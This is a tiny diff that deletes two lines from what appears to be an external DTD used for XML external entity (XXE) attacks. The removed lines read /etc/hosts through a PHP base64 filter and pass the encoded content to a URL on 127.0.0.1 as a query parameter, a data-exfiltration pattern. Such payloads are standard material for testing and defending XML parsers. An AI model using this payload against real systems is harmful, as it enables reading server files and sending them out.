@@ -1,2 +1,0 @@
-<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
-<!ENTITY % wrapper "<!ENTITY content SYSTEM 'http://127.0.0.1:8000/?content=%xxe;'>">
